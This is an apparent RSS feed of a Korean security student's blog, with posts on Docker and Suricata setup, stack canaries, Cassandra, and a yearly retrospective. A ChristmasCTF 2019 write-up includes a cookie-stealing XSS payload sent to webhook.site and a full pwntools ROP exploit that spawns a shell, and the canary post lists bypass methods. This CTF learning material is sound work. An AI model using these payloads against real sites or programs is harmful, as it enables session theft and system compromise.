      <content:encoded><![CDATA[<h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><ul><li>우분투 패키지 업데이트를 진행합니다.</li></ul><pre><code class="bash">sudo apt update</code></pre><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><ul><li>도커 필수 라이브러리를 설치합니다.</li></ul><pre><code class="bash">sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</code></pre><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><ul><li>GPG KEY 등록</li></ul><pre><code class="bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></pre><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><ul><li>Repositry 생성</li></ul><pre><code class="bash">sudo add-apt-repository \&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \$(lsb_release -cs) \stable&quot;</code></pre><h3 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h3><ul><li>도커 설치</li></ul><pre><code class="bash">sudo apt updatesudo apt install dockersudo apt install docker-compose</code></pre>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Docker/">Docker</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Ubuntu/">Ubuntu</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/08/docker-install-210108/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Suricata 설치 &amp; 기초</title>
      <link>https://blog.jhyeon.dev/2021/01/08/suricata-210108/</link>
      <guid>https://blog.jhyeon.dev/2021/01/08/suricata-210108/</guid>
      <pubDate>Thu, 07 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Suricata란&quot;&gt;&lt;a href=&quot;#Suricata란&quot; class=&quot;headerlink&quot; title=&quot;Suricata란?&quot;&gt;&lt;/a&gt;Suricata란?&lt;/h3&gt;&lt;p&gt;IDS(Intrusion Detection System) 시스템으로, 실</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Suricata란"><a href="#Suricata란" class="headerlink" title="Suricata란?"></a>Suricata란?</h3><p>IDS(Intrusion Detection System) 시스템으로, 실시간 IDS, IPS, NSM(Network Security Monitoring) 및 pcap 캡처를 지원한다.</p><h3 id="Suricata-Installation"><a href="#Suricata-Installation" class="headerlink" title="Suricata Installation"></a>Suricata Installation</h3><p>아래 설치 가이드는 우분투 20.04 환경에 맞는 설치 방법이다. 18.04는 아마 “sudo apt install suricata”로도 설치가 가능할 것이다.</p><pre><code class="bash">sudo apt updatesudo apt install software-properties-commonsudo add-apt-repository ppa:oisf/suricata-stablesudo apt updatesudo apt install suricata</code></pre><h3 id="Suricata-기본-룰-셋-다운로드"><a href="#Suricata-기본-룰-셋-다운로드" class="headerlink" title="Suricata 기본 룰 셋 다운로드"></a>Suricata 기본 룰 셋 다운로드</h3><pre><code class="bash">sudo suricata-updatesudo systemctl restart suricata</code></pre><h3 id="테스트-룰-셋"><a href="#테스트-룰-셋" class="headerlink" title="테스트 룰 셋"></a>테스트 룰 셋</h3><pre><code class="bash">alert tcp any any -&gt; any 80 (msg:&quot;Connection to sites.com&quot;; content:&quot;sites.com&quot;; sid:1001; rev:1;)</code></pre><p>위와 같이 테스트 룰 셋을 짜고 저장하면 80포트로 tcp통신하는 sites.com에 대한 패킷을 로그에 찍을 수 있다.</p><p>로그 파일은 “/var/log/suricata/fast.log”에서 볼 수 있고 tail 명령어로 실시간으로 찍어볼 수도 있다.</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Suricata/">Suricata</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Network/">Network</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/08/suricata-210108/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Memory Mitigation - Canary</title>
      <link>https://blog.jhyeon.dev/2021/01/02/mitigation-210102/</link>
      <guid>https://blog.jhyeon.dev/2021/01/02/mitigation-210102/</guid>
      <pubDate>Fri, 01 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Canary-개념&quot;&gt;&lt;a href=&quot;#Canary-개념&quot; class=&quot;headerlink&quot; title=&quot;Canary 개념&quot;&gt;&lt;/a&gt;Canary 개념&lt;/h3&gt;&lt;p&gt;메모리 보호 기법(Memory Protection)의 일부에 해당하고, 일반</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Canary-개념"><a href="#Canary-개념" class="headerlink" title="Canary 개념"></a>Canary 개념</h3><p>메모리 보호 기법(Memory Protection)의 일부에 해당하고, 일반적으로 버퍼 오버플로우(Buffer Overflow) 공격을 수행할 때, SFP(Stack Frame Pointer), RET(Return Address)를 덮어서 공격자가 원하는 흐름을 만들어 줄 수 있는데, 이 때 메모리가 덮어씌워 지는 것을 보호하기 위해서 스택에 할당되는 변수와, SFP(Stack Frame Pointer), RET(Return Address) 사이에서 특정한 값을 추가해서 메모리 변조의 유무를 판단하는 것의 메모리 보호 기법입니다.</p><h3 id="Canary-종류와-우회-방법"><a href="#Canary-종류와-우회-방법" class="headerlink" title="Canary 종류와 우회 방법"></a>Canary 종류와 우회 방법</h3><p>Canary 종류에는 3가지로 분류 해볼 수 있습니다.</p><ol><li>Terminator Canaries</li></ol><ul><li>Canary 값을 문자열의 끝을 나타내는 문자를 이용해서 생성하는 방식</li></ul><ol start="2"><li>Random Canaries</li></ol><ul><li>Canary 값을 랜덤하게 생성 하며, 프로그램 초기 설정 시 전역 변수에 저장</li></ul><ol start="3"><li>Random XOR Canaries</li></ol><ul><li>Canary 값을 모든 제어 데이터 또는 일부를 사용하여 XOR-Scramble 하여 생성</li></ul><h3 id="Canary-Bypassing"><a href="#Canary-Bypassing" class="headerlink" title="Canary Bypassing?"></a>Canary Bypassing?</h3><ol><li><p>Brute-Force<br>Canary 값은 4byte인데 이 값에서 1byte씩 Brute-Force를 수행하면 Canary 값을 알아낼 수 있습니다. 우선 버퍼의 값을 모두 채운다음에 오는 4byte(canary) 값에 대해서 1byte씩 덮으면서 값을 찾아낼 수 있습니다.<br>0x00 ~ 0xFF(256) 가지의 범위를 가지고 돌려보면 됩니다.</p></li><li><p>Recv, Strncpy<br>recv와 strncpy 함수는 문자열을 입력 받을 때 NULL 문자가 들어가지 않습니다. 이 점을 이용해서 버퍼가 printf 된다면 버퍼를 채워서 canary값을 출력하게 할 수 있습니다.</p></li><li><p>Canary Routine Leak<br>Canary를 생성하는 루틴이 노출될 경우 역 연산을 통해서 Canary 값을 알아낼 수 있습니다.</p></li></ol><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://www.notion.so/jhyeon/Memory-Mitigation-Canary-c00cbfe3a8594b3398138fcf2adb7796">https://www.notion.so/jhyeon/Memory-Mitigation-Canary-c00cbfe3a8594b3398138fcf2adb7796</a></p></li><li><p><a href="https://koharinn.tistory.com/49">https://koharinn.tistory.com/49</a></p></li><li><p><a href="https://xerxes-break.tistory.com/285">https://xerxes-break.tistory.com/285</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Linux/">Linux</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Canary/">Canary</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Memory-Mitigation/">Memory Mitigation</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/02/mitigation-210102/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2020년 정리 &amp; 2021년 계획</title>
      <link>https://blog.jhyeon.dev/2021/01/02/newyear-210102/</link>
      <guid>https://blog.jhyeon.dev/2021/01/02/newyear-210102/</guid>
      <pubDate>Fri, 01 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;2020-한-해를-돌아보며&quot;&gt;&lt;a href=&quot;#2020-한-해를-돌아보며&quot; class=&quot;headerlink&quot; title=&quot;2020 한 해를 돌아보며&quot;&gt;&lt;/a&gt;2020 한 해를 돌아보며&lt;/h2&gt;&lt;h3 id=&quot;2020-01-전공-동아리-회장</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="2020-한-해를-돌아보며"><a href="#2020-한-해를-돌아보며" class="headerlink" title="2020 한 해를 돌아보며"></a>2020 한 해를 돌아보며</h2><h3 id="2020-01-전공-동아리-회장"><a href="#2020-01-전공-동아리-회장" class="headerlink" title="2020.01 [전공 동아리 회장]"></a>2020.01 [전공 동아리 회장]</h3><p>2020년을 시작하면서 학교에 입학할 시기부터 활동 해왔던 “해킹 &amp; 보안 동아리인, B@ngsiri 회장을 맡게 되었다.</p><p>회장 후보로 나갈 때 다짐했던 것이 기존의 스터디, 세미나, 교육 같은 부분에 있어서 개선을 하고 동아리에 도움이 되는 것들이 있다면</p><p>많이 끌어와서 동아리원들에게 많은 도움이 되었으면 하는게 회장 공약이였고, 내 다짐이기도 했다.</p><p>그렇게 회장에 당선되고 첫 시작으로 KUCIS(대학정보보호동아리연합회) 신청을 시작으로 여러 교육작인 부분이나 세미나들을 알아 보면서</p><p>동아리원들에게 공지하고 하면서 한달 두달 보내왔던 것 같다.</p><p>이제 3월이 되고부터는 본격적으로 동아리 홍보에 나서면서 학과에 들어오는 신입생들에 대한 모집을 시작했다.</p><p>이번년 초에 코로나19가 확산되면서 사실 오프라인 자리에서는 신입생들을 직접 보면서 홍보를 할 수 없었고 같이 만나서 회식을 하거나 이런 자리도 사실 불가능 했다.</p><p>그래서 결국 모집에 있어서는 100% 비대면으로 진행을 했고, 이런 문제를 처음 겪다보니 온라인으로 행사를 준비하는 것이 되게 많이 힘들었던 것 같다.</p><p>기존에는 오프라인 모임을 가져서 동아리 홍보도 하고, 후배들이 선배들에게 궁금한 것도 묻고 서로 친해지는 자리가 있었는데 올해는 그런게 없었다..</p><p>그렇지만 어떻게 진행은 했기에 신입생도 모집하고 했지만 그 다음이 항상 문제였다.. 오프라인으로 진행될 행사들이 다 온라인으로 전환되거나 취소되면서,</p><p>단도직입적으로 말하면 기존 동아리원들이나 신입생들에게 챙겨줄 수 있는게 많이 없었다. 그래서 지난 부분들 돌아보면 이런게 가장 미안하면서도 좀 아쉬웠던 부분으로 남았다.</p><p>결코 회장이라는 자리가 확실히 부담감이 있고 무겁게 느껴졌지만 옆에서 같이 도와주는 운영진들이 있었기에 버틸 수 있지 않았나 싶었다..</p><h3 id="2020-06-BOB-9기-합격"><a href="#2020-06-BOB-9기-합격" class="headerlink" title="2020.06 [BOB 9기 합격]"></a>2020.06 [BOB 9기 합격]</h3><p>금년 5월부터 준비하던 BOB(이하, best of the best 9th) 교육생으로 최종 합격을 하였다.</p><p>서류 접수부터 필기 시험 면접 준비까지 작년처럼 생생한 기억이 들었고 올해는 꼭 붙겠다는 마인드 하나로 되게 열심히 준비했었던 것 같다.</p><p>(일반 생활 시간 빼면 거의 BOB 준비에 투자할 만큼 열정을 쏟아 부었지..)</p><p>최종 합격 이후 7월부터 이제 본격적인 교육생 신분으로 최고 정보보안전문가인 멘토님들에게 지도를 받고 9월에는 사람들끼리 팀을 모아 하나의 프로젝트를 하는 기간이였다.</p><p>7-8월 교육때 거의 밥먹는 것도 포기하면서 하루 10-15시간 교육을 들어서 그런지 하루가 어떻게 지나갔는지도 모르겠다. (이 때 진짜 죽을뻔..)</p><p>그렇게 두달이 순식간에 지나가고 9월이 되면서 프로젝트 준비에 한창이였는데 이 때가 가장 고민이 많았다. 왜냐하면 주제를 선정하는데도 어려움이 있었고,</p><p>우리팀을 맡아서 지도 해주실 멘토님들도 섭외를 해야했기에.. 그래도 멋진 멘토님들을 구해서 함께 할 수 있어서 정말 좋았다.</p><p>같은 팀원으로써도 열심히 해준 팀원들에게도 감사하다는 인사 올립니다!</p><p>어쩌다보니 벌써 새해 1월이고 이제 수료까지 3개월밖에 남지 않았다는 것에 아쉬움이 많이 남고있지만 남은 기간 화이팅 해볼 예정입니다!</p><h3 id="2020-09-해킹-보안-연구-데몬팀-합격"><a href="#2020-09-해킹-보안-연구-데몬팀-합격" class="headerlink" title="2020.09 [해킹/보안 연구 데몬팀 합격]"></a>2020.09 [해킹/보안 연구 데몬팀 합격]</h3><p>개인적으로 들어가고 싶었던 해킹팀에 올해 지원을 해서 합격을 하였다.</p><p>준비하는 기간동안 역량을 테스트하는 과제가 주어졌었고 그 과제를 하나하나 해나가면서 열심히 준비했다.</p><p>(지원 기간동안 BOB랑 많이 겹쳐서 못한 과제도 많아서 불안했던 건 사실…)</p><p>결과로 데몬팀에 최종 합격할 수 있었다는 메일을 받아볼 수 있었고, 뿌듯함과 동시에 열심히 해야겠다는 생각도 많이 들었다.</p><h3 id="앞으로의-계획"><a href="#앞으로의-계획" class="headerlink" title="앞으로의 계획"></a>앞으로의 계획</h3><ol><li><p>취업</p></li><li><p>자격증 취득 &amp;&amp; 개인 공부</p></li><li><p>건강(헬스 등..)</p></li></ol><p>큰 분류로 3개 나눠봤다우선 순위이자 계획이고 하나하나 열심히 준비해서 2021년에는 좀 더 성실한 사람이 되야겠다.</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Memo/">Memo</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/%ED%9A%8C%EA%B3%A0/">회고</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/02/newyear-210102/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>웹 해킹 기법 기초</title>
      <link>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/</link>
      <guid>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/</guid>
      <pubDate>Thu, 31 Dec 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;해당 포스트는 노션으로 이전되었습니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0&quot;&gt;https://www.notion</description>
        
      
      
      
      <content:encoded><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0">https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web-Hacking/">Web Hacking</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>시스템 OS 개념 및 기초</title>
      <link>https://blog.jhyeon.dev/2021/01/01/systemos-210101/</link>
      <guid>https://blog.jhyeon.dev/2021/01/01/systemos-210101/</guid>
      <pubDate>Thu, 31 Dec 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;해당 포스트는 노션으로 이전되었습니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/OS-Basic-8ab6955b2060478fa2a7846d128f7490&quot;&gt;https://www.notion.so/jhyeo</description>
        
      
      
      
      <content:encoded><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/OS-Basic-8ab6955b2060478fa2a7846d128f7490">https://www.notion.so/jhyeon/OS-Basic-8ab6955b2060478fa2a7846d128f7490</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/System/">System</category>
      
      <category domain="https://blog.jhyeon.dev/tags/OS/">OS</category>
      
      <category domain="https://blog.jhyeon.dev/tags/syscall/">syscall</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/01/systemos-210101/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ChristmasCTF 2019 Write up</title>
      <link>https://blog.jhyeon.dev/2020/12/26/christmasctf-201226/</link>
      <guid>https://blog.jhyeon.dev/2020/12/26/christmasctf-201226/</guid>
      <pubDate>Fri, 25 Dec 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;1-Web-watermelon&quot;&gt;&lt;a href=&quot;#1-Web-watermelon&quot; class=&quot;headerlink&quot; title=&quot;1. [Web] watermelon&quot;&gt;&lt;/a&gt;1. [Web] watermelon&lt;/h3&gt;&lt;p&gt;이 문제는 언인</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="1-Web-watermelon"><a href="#1-Web-watermelon" class="headerlink" title="1. [Web] watermelon"></a>1. [Web] watermelon</h3><p>이 문제는 언인텐 풀이로 푼 것 같다. 문제 내에서 로그인 계정 중</p><p>admin 계정에 대해서</p><p>비밀번호가 admin 과 같이 세팅되어 있음을 알 수 있었고,</p><p>이를 통해 로그인 하여 플래그를 얻어낼 수 있었다.</p><h3 id="2-Web-JWT"><a href="#2-Web-JWT" class="headerlink" title="2. [Web] JWT"></a>2. [Web] JWT</h3><pre><code class="js">jwt: &#123;    bruth: &#123;      key: &#39;********&#39;, // 0~9, 8 length      options: &#123;        issuer: &#39;c2w2m2&#39;,        expiresIn: &#39;1d&#39;,        algorithm: &#39;HS256&#39;,      &#125; &#125;;</code></pre><p>해당 문제는 PHP JWT TOKEN 를 사용하는 문제이다.</p><p>config.js 에서 위와 같은 내용을 확인할 수 있었고</p><p>결론적으로 secret key를 브포해서 찾아내야 하는 것이였다.</p><p>그래서 해당 범위 내 숫자로 구성해서 브포를 돌려서 토큰의 secret key를 얻었고,</p><p>payload 부분에 있는 is_admin 항목을 true로 변조한 뒤 다시 인코딩하여 쿠키를 바꿔줌으로써 플래그를 얻었다.</p><ul><li>참고 : john the ripeer(<a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a>)</li></ul><h3 id="3-Web-CSRF"><a href="#3-Web-CSRF" class="headerlink" title="3. [Web] CSRF"></a>3. [Web] CSRF</h3><p>해당 문제는 CSRF(Cross-site-Request-Forgery) 취약점을 사용한 문제이다.</p><p>문제에 보면 게시글을 쓸 수 있는 공간이 있고, 해당 로직을 처리하는 부분의 코드를 분석했을 때 다음과 같은 사실을 알 수 있다.</p><pre><code class="js">if (board.content.match(/script|img|on/i)) return res.send(&#123; code: 400 &#125;);</code></pre><p>무려 내용 작성에 대해서만 필터링을 걸고 제목에는 없다.. 그래서 이를 이용해서 제목에 페이로드를 넣었다.</p><pre><code class="js">location.href=&#39;https://webhook.site~&#39; + document.cookie;</code></pre><h3 id="4-Pwn-Solo-test"><a href="#4-Pwn-Solo-test" class="headerlink" title="4. [Pwn] Solo test"></a>4. [Pwn] Solo test</h3><p>ROP 기법을 이용해서 풀면 된다.</p><pre><code class="py">#!/usr/bin/pythonfrom pwn import *p = process(&#39;./solo_test&#39;)e = ELF(&#39;./solo_test&#39;)libc = ELF(&#39;./libc227.so&#39;)pr = 0x0000000000400b83ret = 0x00000000004005f1puts_plt = e.plt[&#39;puts&#39;]puts_got = e.got[&#39;puts&#39;]solo = e.symbols[&#39;solo&#39;]puts_offset = libc.symbols[&#39;puts&#39;]system_offset = libc.symbols[&#39;system&#39;]binsh_offset = next(libc.search(&quot;/bin/sh&quot;))p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;Me&#39;)p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;No&#39;)p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;CTF&#39;)p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;Never&#39;)p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;No&#39;)payload = &quot;A&quot;*88payload += p64(pr)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(solo)p.sendlineafter(&#39;--&gt; &#39;,payload)puts_addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;))libc_base = puts_addr - puts_offsetsystem_addr = libc_base + system_offsetbinsh_addr = libc_base + binsh_offsetpayload = &quot;A&quot;*88payload += p64(pr)payload += p64(binsh_addr)payload += p64(ret)payload += p64(system_addr)p.sendlineafter(&#39;--&gt; &#39;, payload)p.interactive()p.close()</code></pre>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/ChristmasCTF2019/">ChristmasCTF2019</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/12/26/christmasctf-201226/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>BISC CTF 2020(oldschool) write up</title>
      <link>https://blog.jhyeon.dev/2020/11/21/bob-bisc-201129/</link>
      <guid>https://blog.jhyeon.dev/2020/11/21/bob-bisc-201129/</guid>
      <pubDate>Fri, 20 Nov 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;사실 풀고나니 꽤나 쉬웠던 것 같은 문제인데, 요즘 시스템쪽을 하는둥 마는둥 하다보니 익스코드 짜는데&lt;/p&gt;
&lt;p&gt;오래 걸려버려서 대회 중에는 인증을 못해봤었다.. (틈틈히 챙겨야 할듯)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.noti</description>
        
      
      
      
      <content:encoded><![CDATA[<p>사실 풀고나니 꽤나 쉬웠던 것 같은 문제인데, 요즘 시스템쪽을 하는둥 마는둥 하다보니 익스코드 짜는데</p><p>오래 걸려버려서 대회 중에는 인증을 못해봤었다.. (틈틈히 챙겨야 할듯)</p><p><a href="https://www.notion.so/jhyeon/BISC-2020-oldschool-write-up-7b4dc57cf9834eab9f1260adf1b609f5">https://www.notion.so/jhyeon/BISC-2020-oldschool-write-up-7b4dc57cf9834eab9f1260adf1b609f5</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/BISC2020/">BISC2020</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/ROP/">ROP</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/11/21/bob-bisc-201129/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>POX(Power of xx) 2020 Write up</title>
      <link>https://blog.jhyeon.dev/2020/11/21/poxctf-201121/</link>
      <guid>https://blog.jhyeon.dev/2020/11/21/poxctf-201121/</guid>
      <pubDate>Fri, 20 Nov 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;POX 2020 출제자 Write up 자료입니다.&lt;/p&gt;
&lt;p&gt;아래 노션에서 풀이를 확인하실 수 있습니다.&lt;/p&gt;
&lt;p&gt;질문 사항이 있으시면 &lt;a href=&quot;mailto:&amp;#115;&amp;#x74;&amp;#x6a;&amp;#104;&amp;#121;&amp;#101;&amp;#x6f</description>
        
      
      
      
      <content:encoded><![CDATA[<p>POX 2020 출제자 Write up 자료입니다.</p><p>아래 노션에서 풀이를 확인하실 수 있습니다.</p><p>질문 사항이 있으시면 <a href="mailto:&#115;&#x74;&#x6a;&#104;&#121;&#101;&#x6f;&#110;&#64;&#107;&#x61;&#x6b;&#x61;&#x6f;&#x2e;&#x63;&#111;&#x6d;">&#115;&#x74;&#x6a;&#104;&#121;&#101;&#x6f;&#110;&#64;&#107;&#x61;&#x6b;&#x61;&#x6f;&#x2e;&#x63;&#111;&#x6d;</a> 으로 메일을 보내주세요!</p><p><a href="https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417">https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/POX2020/">POX2020</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/11/21/poxctf-201121/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NoSQL - Cassandra Engine</title>
      <link>https://blog.jhyeon.dev/2020/09/25/cassandra-200925/</link>
      <guid>https://blog.jhyeon.dev/2020/09/25/cassandra-200925/</guid>
      <pubDate>Thu, 24 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Cassandra&quot;&gt;&lt;a href=&quot;#Cassandra&quot; class=&quot;headerlink&quot; title=&quot;Cassandra&quot;&gt;&lt;/a&gt;Cassandra&lt;/h2&gt;&lt;h3 id=&quot;Cassandra란&quot;&gt;&lt;a href=&quot;#Cassandra란&quot; cla</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Cassandra"><a href="#Cassandra" class="headerlink" title="Cassandra"></a>Cassandra</h2><h3 id="Cassandra란"><a href="#Cassandra란" class="headerlink" title="Cassandra란?"></a>Cassandra란?</h3><p>Cassandra(Free-Open Source Distributed NoSQL Database) 는 분산형 오픈소스 NoSQL Database이며,</p><p>단일 장애점(Single Point of Failure, SPOF) 없이 고성능을 제공하며 많은 서버들간에 대용량 데이터를 관리하기 위해 설계되었습니다.</p><p>Cassandra는 여러 데이터 센터(Data Center)에 걸쳐 Cluster를 지원하고 있으며 대용량의 데이터, 구조화, 비정형 데이터를 관리하는데 적합합니다.</p><h3 id="Cassandra의-장점-및-단점"><a href="#Cassandra의-장점-및-단점" class="headerlink" title="Cassandra의 장점 및 단점"></a>Cassandra의 장점 및 단점</h3><p>장점 : Consistent Hashing 구조를 이용한 Ring구조와 Gossip Protocol을 구현하였기 때문에,</p><p>각 노드의 장비추가, 제거 등이 자유롭고 데이터 센터까지 고려할 수 있는 데이터 복제 정책을 사용하고 있어 안정성 측면에서 많은 장점을 가지고 있습니다.</p><p>Cassandra를 이용하면 Sharing, Master-Slave와 같은 정책 없이도 장애 대응이 가능하며 장비를 늘리고 줄이는 것에 큰 비용이 들지 않습니다.</p><p>단점 : Cassandra는 테이블 간 Join이나 Transaction을 지원하지 않고, Index 등의 검색을 위한 기능도 매우 단출하며,</p><p>Cassandra의 구조상 RDBMS와 같은 페이징(Paging)을 구현하는 것이 어렵고 Keyspace, Table을 과도하게 생성할 경우 메모리 오버플로우가 발생할 수 있습니다.</p><h3 id="Cassandra-Data-Structure"><a href="#Cassandra-Data-Structure" class="headerlink" title="Cassandra Data Structure"></a>Cassandra Data Structure</h3><img src="/img/post/cassandra/1.png" class="lazyload" data-srcset="/img/post/cassandra/1.png" srcset="data:image/png;base64,666"><p>Cassandra의 데이터 구조는 다음 사진과 같습니다.</p><p>Keyspace -&gt; Table -&gt; Row key -&gt; Column(Name, Value)로 구성되어 있습니다.</p><p>이 때 Keyspace와 Table에 대한 정보는 모든 Cassandra Node의 Memory에 저장되며 실제 데이터가 저장되는 Row는 각 Row-key를 가지고,</p><p>Hash(token)을 기준으로 각 노드에 분산 저장되어있습니다. 그리고 Row에 속하는 Column은 Column Name을 기준으로 정렬되어 저장됩니다.</p><h3 id="Cassandra-Column-Super-Column"><a href="#Cassandra-Column-Super-Column" class="headerlink" title="Cassandra Column, Super Column"></a>Cassandra Column, Super Column</h3><p>Cassandra의 컬럼과 슈퍼컬럼 두 컬럼 모두 Name, Value로 이루어진 튜플형입니다.</p><p>이 두 컬럼의 차이점은 문자열(String)과 Map 형태의 차이점입니다.</p><p>즉, 슈퍼컬럼의 값에는 다양한 형태의 데이터 타입을 가질 수 있습니다.</p><h3 id="Cassandra-설치"><a href="#Cassandra-설치" class="headerlink" title="Cassandra 설치"></a>Cassandra 설치</h3><ul><li><a href="https://cassandra.apache.org/download/">https://cassandra.apache.org/download/</a></li></ul><h3 id="Cassandra-예제"><a href="#Cassandra-예제" class="headerlink" title="Cassandra 예제"></a>Cassandra 예제</h3><p>Cassandra CQL Shell에 접속하는 방법은 다음과 같습니다. (Debian/Ubuntu 기준)</p><pre><code class="bash">$ cqlsh</code></pre><p>이 때, 사용자 인증을 거치지않고 쉘에 접속하게 되는데 보안 설정을 위해서는 다음과 같이 설정합니다.</p><pre><code class="bash">$ sudo vi /etc/cassandra/cassandra.yaml</code></pre><p>(104 Lines) authenticator: PasswordAuthenticator # AllowAllAuthenticator 주석 처리 후 변경</p><p>이후 CQL Shell에 접속하기 위해서는 다음과 같은 명령어로 접속합니다.</p><pre><code class="bash">$ cqlsh -u cassandra -p cassandra # 기본 계정</code></pre><p>하지만 위와 같은 방법도 기본 계정으로 설정되어 있기 때문에 새로운 유저를 추가해서 사용하는 방식으로 변경합니다.</p><pre><code class="bash">cassandra@cqlsh&gt; create user username with password &#39;password&#39; superuser;cassandra@cqlsh&gt; exit</code></pre><pre><code class="bash">$ cqlsh -u username -p password</code></pre><pre><code class="bash">cassandra@cqlsh&gt; drop user cassandra;cassandra@cqlsh&gt; LIST USERS; /* 생성된 계정 확인 */</code></pre><p>이제 Cassandra에 대한 기본적인 보안을 거쳐 사용하실 수 있습니다!</p><h3 id="새로운-Keyspace-생성"><a href="#새로운-Keyspace-생성" class="headerlink" title="새로운 Keyspace 생성"></a>새로운 Keyspace 생성</h3><pre><code class="sql">username@cqlsh&gt; create keyspace keyspace_name with replication = &#123;&#39;class&#39;: &#39;SimpleStrategy&#39;, &#39;replication_factor&#39;: 3&#125;;username@cqlsh&gt; desc keyspaces; /* 생성된 keyspace 확인 */</code></pre><p>Replication이란 Keyspace를 생성할때 Replication의 복제 개수, 위치를 결정할 수 있는데 옵션은 아래와 